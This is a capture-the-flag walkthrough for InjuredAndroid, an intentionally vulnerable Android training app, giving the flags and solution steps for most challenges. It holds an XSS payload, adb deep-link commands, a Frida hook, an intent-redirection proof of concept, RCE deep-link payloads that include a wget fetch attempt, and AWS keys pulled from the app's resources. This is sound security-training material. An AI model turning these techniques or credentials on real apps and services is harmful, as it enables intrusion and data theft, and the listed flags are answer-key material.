**Walkthrough b3nac.injuredandroid**

* * *

### **XSSTEXT**

Simply put the alert script:

```
<script>alert('super hacker')</script>
```

Code: 

```
WebView webView = new WebView(this);
        setContentView(webView);
        String stringExtra = getIntent().getStringExtra(XSSTextActivity.POST_STRING);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebChromeClient(new WebChromeClient());
```

The code reads the intent and pass it to the webView object with te Javascript enabled.

### **1 - LOGIN**


The Activity checks for the flag on the condition: 

```
((EditText) findViewById(C0438R.C0441id.editText2)).getText().toString().equals("F1ag_0n3")
```

FLAG: F1ag_0n3

### **2 - EXPORTED ACTIVITY**

On the AndroidManifest.xml we check wich activities are exported: 

```
        <activity android:exported="true" android:name="b3nac.injuredandroid.b25lActivity"/>
```

If we start this activity through adb we get the second flag.

``
adb shell am start -n b3nac.injuredandroid/.b25lActivity
``

FLAG: S3c0nd_F1ag

### **3 - RESOURCES**

On this one we should check the resources: 

```
if (obj.equals(getString(C0438R.string.cmVzb3VyY2VzX3lv)))
```

On the file, "res/values/strings.xml", we can check the flag.

```
<string name="cmVzb3VyY2VzX3lv">F1ag_thr33</string>
```

FLAG: F1ag_thr33

### **4 - LOGIN 2**

Again we can see at the condition that the value is obtained and then compared: 
```
((EditText) findViewById(C0438R.C0441id.editText2)).getText().toString().equals(new String(new Decoder().getData()))
```

So we just need to get the value form the Decoder().

```
byte[] data = Base64.decode("NF9vdmVyZG9uZV9vbWVsZXRz", 0);
```

The value is on b64.

FLAG: 4_overdone_omelets

### **5 - EXPORTED BROADCAST RECEIVER**

We got a broadcast receiver 

```
static final String ACTION_CUSTOM_BROADCAST = "com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT";
.
.
.
if (i == 0) {
            StringBuilder sb = new StringBuilder();
            sb.append("Action: " + intent.getAction() + "\n");
            sb.append("URI: " + intent.toUri(1) + "\n");
            String sb2 = sb.toString();
            Log.d("DUDE!:", sb2);
            Toast.makeText(context, sb2, 1).show();
            wtf = wtf + 1;
        } else if (i == 1) {
            Toast.makeText(context, "Keep trying!", 1).show();
            wtf++;
        } else if (i == 2) {
            FlagsOverview.flagFiveButtonColor = true;
            sharedPreferences.edit().putBoolean("flagFiveButtonColor", true).commit();
            Toast.makeText(context, "You are a winner " + VGV4dEVuY3J5cHRpb25Ud28.decrypt("Zkdlt0WwtLQ="), 1).show();
        } else {
            Toast.makeText(context, "Keep trying!", 1).show();
        }
```

If we send a broadcast message 3 times to the ACTION_CUSTOM_BROADCAST we go to the i == 2 condition and will get the flag.

Or simply visit 3 times the activity

FLAG: F1V3!

### **6 - LOGIN 3**

Check the condition for: 
```
((EditText) findViewById(C0438R.C0441id.editText3)).getText().toString().equals(VGV4dEVuY3J5cHRpb25Ud28.decrypt("k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ=="))
```

So the class VGV4dEVuY3J5cHRpb25Ud28 have a method decrypt, wich the string encoded passed will be the flag.

The decrypt method is a standard DES.

```
SecretKey generateSecret = SecretKeyFactory.getInstance("DES").generateSecret(new DESKeySpec(KEY));
                byte[] decode = Base64.decode(str, 0);
                Cipher instance = Cipher.getInstance("DES");
                instance.init(2, generateSecret);
                String str2 = new String(instance.doFinal(decode));
                Log.d("Oh snap!", "Decrypted: " + str + " -> " + str2);
                return str2;
```

With the key from the hide class.

```
private static byte[] encKeyTwo = Base64.decode("e0NhcHR1cjNUaDFzVG9vfQ==", 0);
//{Captur3Th1sToo}
```

Frida snippet: 

```
Java.perform(function x() {
    console.log("Inside java perform function");
    var my_class = Java.use("b3nac.injuredandroid.VGV4dEVuY3J5cHRpb25Ud28");

    my_class.decrypt.overload("java.lang.String").implementation = function (x) {
        //Create the string with de data
        var my_string = Java.use("java.lang.String").$new("k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==");
        //Call decrypt method with the data
        var decrypted = this.decrypt(my_string);
        console.log("String decrypted: " + decrypted);
        return decrypted;
    };
});
```


FLAG: {This_Isn't_Where_I_Parked_My_Car}

### **7 - SQLITE**

This one we can see the code that create the database and destroys it when exit the activity.

```
SQLiteDatabase writableDatabase = this.dbHelper.getWritableDatabase();
        ContentValues contentValues = new ContentValues();
        contentValues.put(DatabaseSchema.Add.COLUMN_NAME_TITLE, Base64.decode("VGhlIGZsYWcgaGFzaCE=", 0));
        contentValues.put(DatabaseSchema.Add.COLUMN_NAME_SUBTITLE, Base64.decode("MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=", 0));
        writableDatabase.insert(DatabaseSchema.Add.TABLE_NAME, null, contentValues);
        contentValues.put(DatabaseSchema.Add.COLUMN_NAME_TITLE, Base64.decode("VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==", 0));
        contentValues.put(DatabaseSchema.Add.COLUMN_NAME_SUBTITLE, Hide.getRemoteUrl());
        writableDatabase.insert(DatabaseSchema.Add.TABLE_NAME, null, contentValues);
```

The values are: 

Hide.getRemoteUrl() -> 9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@>^DB=:E6];D@?
MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc= -> 2ab96390c7dbe3439de74d0c9b0b1767

So to check them on the device we need to conect to the database: 

``adb shell ``
``cd /data/data/b3nac/injuredandroid/databases``
``sqlite3``
``> .tables``
``> select * from Thisisatest;``


1|The flag hash!|2ab96390c7dbe3439de74d0c9b0b1767
2|The flag is also a password!|9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@>^DB=:E6];D@?


The hash is a md5 to hunter2

And we got the hint to use rotation on this string encoded: 

https://injuredandroid.firebaseio.com/sqlite.json

There we can check the second flag: 

"S3V3N_11"

FLAG: S3V3N_11
Password: hunter2

### **8 - AWS**

This one we need to use the aws cli tools. On the values.xml there is to interesting values: 

```
<string name="AWS_ID">AKIAZ36DGKTUIOLDOBN6</string>
<string name="AWS_SECRET">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</string>
```

To configure aws simply: 

``aws configure``

Put the ID and the SECRET the rest by default, after we got the aws configured que can check the database in aws.

``aws s3 ls``
``aws s3 ls injuredandroid``


 We got the file: C10ud_S3cur1ty_lol

 FLAG: C10ud_S3cur1ty_lol

###  **9 - FIREBASE**

Another database challenge, we got the b64 firebase endpoint:

ZmxhZ3Mv -> flags/

If we go to the firebase endpoint: 

https://injuredandroid.firebaseio.com/flags.json

we see the 

[nine!_flag]

To check if correct be aware of the b64 encode back: 
```
final String str = new String(Base64.decode(((EditText) findViewById(C0438R.C0441id.editText2)).getText().toString(), 0), StandardCharsets.UTF_8);
```

FLAG: W25pbmUhX2ZsYWdd

### **10 - UNICODE**

For this case we can research for the dotless i hack on Github: 

More context coming: https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/



Submit the magic email with the dotless i: John@Gıthub.com <-> xn--john@gthub-2ub.com

### **11 - DEEPLINKS**

This one is a deeplink activity, firs twe check on the AndroidManifest the intents that are accepted from the activity: 

![image-20201020194647157](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201020194647157.png)

Two intents are defined for this activity with two schemas (https/flag11), so i send a intent through adb:

```bash
adb shell am start -a android.intent.action.VIEW -d "flag11://google.com" b3nac.injuredandroid
```

The hints said to us that we completed one part of the puzzle and in order to continue we must find the compiled treasure, so in the application we must have an executable compiled:

In my case i didnt find any compiled binary besides the narnia eld:

![image-20201020200322924](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201020200322924.png)

So i cheated a little bit and saw the source code from github and check the menu.go file: 

The string returned is HIIMASTRING

![image-20201020200511068](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201020200511068.png)

FLAG: HIIMASTRING

### **12 - PROTECTED COMPONENTS**

This one it will tell us to use an exported activity and that we will need a secondary app to enter this component, as always go to AndroidManifest:

```xml
<activity android:exported="true" android:label="@string/title_activity_exported_protected_intent" android:name="b3nac.injuredandroid.ExportedProtectedIntent" android:theme="@style/AppTheme.NoActionBar"/>
<activity android:exported="true" android:name="b3nac.injuredandroid.QXV0aA"/>
<activity android:label="@string/title_activity_flag_twelve_protected" android:name="b3nac.injuredandroid.FlagTwelveProtectedActivity" android:theme="@style/AppTheme.NoActionBar"/>
        
```

I check the b3nac.injuredandroid.ExportedProtectedIntent activity:

```java
/* access modifiers changed from: protected */
public void onResume() {
    super.onResume();
    handleIntentExtras(getIntent());
}
private void handleIntentExtras(Intent intent) {
    Intent intent2 = (Intent) intent.getParcelableExtra("access_protected_component");
    if (intent2 != null) {
        startActivity(intent2);
    }
}
```

This code will allow to execute any call to this intent, because is android:exported="true" and dont check anything from code side also it will make and startActivity(intent).

The b3nac.injuredandroid.FlagTwelveProtectedActivity will load a "protected" intent to execute loadUrl for the webView object:

```Uri parse = Uri.parse(getIntent().getStringExtra("totally_secure"));
Uri parse = Uri.parse(getIntent().getStringExtra("totally_secure"));
webView.getSettings().setJavaScriptEnabled(true);
webView.setWebChromeClient(new WebChromeClient());
if (getIntent() == null || !getIntent().hasExtra("totally_secure")) {
	finish();
} else if ("https".equals(parse.getScheme())) {
    webView.loadUrl(getIntent().getStringExtra("totally_secure"));
    FlagsOverview.flagTwelveButtonColor = true;
    new SecureSharedPrefs().editBoolean(getApplicationContext(), "flagTwelveButtonColor", true);
    correctFlag();
} else {
    webView.loadData(getIntent().getStringExtra("totally_secure"), "text/html", "UTF-8");
}
```

But this activity only can be opened if we pass a Intent to the application. Combining the two methods we got:

ExportedProtectedIntent

​	|___> Intent("access_protected_component")

​							|___>startActivity(intent("FlagTwelveProtectedActivity"))

​													|___> loadUrl("totally_secure")

This way we can start activities that were not designed to be exported.

```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent secureIntent = new Intent();
    secureIntent.setClassName("b3nac.injuredandroid","b3nac.injuredandroid.FlagTwelveProtectedActivity");
    secureIntent.putExtra("totally_secure","https://google.com");

    Intent exportedIntent = new Intent();
    exportedIntent.setClassName( "b3nac.injuredandroid","b3nac.injuredandroid.ExportedProtectedIntent");
    exportedIntent.putExtra("access_protected_component", secureIntent);

    startActivity(exportedIntent);
}
```

### **13 - RCEActivity**

As always we start at the AndroidManifest:

```xml
<activity android:label="@string/title_activity_rce" android:name="b3nac.injuredandroid.RCEActivity" android:theme="@style/AppTheme.NoActionBar">
    <intent-filter android:label="filter_view_flag11">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:host="rce" android:scheme="flag13"/>
    </intent-filter>
</activity>
```

This activity also is not exported but have an intent defined with the host "rce" and scheme "flag13". So i must check: 

````bash
adb shell am start -a android.intent.action.VIEW -d "flag13://rce" b3nac.injuredandroid
````

Clearly it didn't work. The error message said that we need to find the binary... the only binary besides the menu is te narnia ELF.

Also it will check for 3 parameters and two of them will use it to execute through exec() call: 

````java
String queryParameter = data.getQueryParameter("binary");
String queryParameter2 = data.getQueryParameter("param");
final String queryParameter3 = data.getQueryParameter("combined");
....
    runtime.exec(getFilesDir().getParent() + "/files/" + queryParameter + " " + queryParameter2).getInputStream()
....
````

For this solution i had to check his video in youtube because i didnt understood it actually, didnt find the magic word Treasure_Planet and the go binary was to large (Go) to analyze: 

![image-20201020210804211](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201020210804211.png)

To solve i executed three times: 

````bash
adb shell am start -a android.intent.action.VIEW -d "flag13://rce?binary=narnia.x86_64&param=1" b3nac.injuredandroid
adb shell am start -a android.intent.action.VIEW -d "flag13://rce?binary=narnia.x86_64&param=1" b3nac.injuredandroid
adb shell am start -a android.intent.action.VIEW -d "flag13://rce?binary=narnia.x86_64&param=1" b3nac.injuredandroid
adb shell am start -a android.intent.action.VIEW -d "flag13://rce?combined=Treasure_Planet" b3nac.injuredandroid
````

In order to test more about RCE, i setup a SimpleHTTPServer with an index.html on my machine, then executed the next intent: 

````bash
adb shell am start -a android.intent.action.VIEW -d "flag13://rce?binary=/system/xbin/bin/wget&param=http://192.168.56.1/index.html" b3nac.injuredandroid
````

But the wget binary was innaccesible or not found.

### **14 - FLUTTER XSS**

WTF 

It seems that i dont have the kernel_blob.bin :(

![image-20201021180219367](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201021180219367.png)

Downloaded version 1.0.10. Also, on the emulator if i click on this menu entry it will close the application.

### **15 - ASSEMBLY**

This one tell us to convert the byte array into a string: 

58 40 42 -> :(*

Then it seems to reverse the .so file to get the XOR key, we got two .so files on the lib folder (x86):

![image-20201027124433253](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201027124433253.png)

In the AssemblyActivity there is two indicators that is using JNI to call some function on the libnative-lib.so: 

![image-20201027125620045](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201027125620045.png)

![image-20201027125631343](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201027125631343.png)

On IDA i see the export function stringFromJNI

![image-20201027125827537](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201027125827537.png)

And the unk_27074 is passed as a argument from the basic_string, going to the structure: 

![image-20201027130054211](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201027130054211.png)



![image-20201027130103157](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201027130103157.png)

There is the WIN string.

Also there is a MAD string if we xor decode the bytes with the key MAD it will decode to the win string

![image-20201027131429156](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201027131429156.png)



FLAG: win (underscore :))



### **16 - CSP BYPASS**

On the AndroidManifest.xml 

![image-20201027134152169](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201027134152169.png)

The activity accept any browsable intent with: 

http://b3nac.com/.*

On the source code it seems that we need to bypass in order to execute the intent we want:

![image-20201027140936222](C:\Users\ximo\AppData\Roaming\Typora\typora-user-images\image-20201027140936222.png)

Dont know about this trick so i checked: https://www.youtube.com/watch?v=PMKnPaGWxtg

Seems that to bypass the CSP simply we can create an html file and opening with Chrome app instead sending an intent through adb.

### **17 - SSL PINNING BYPASS**

tbd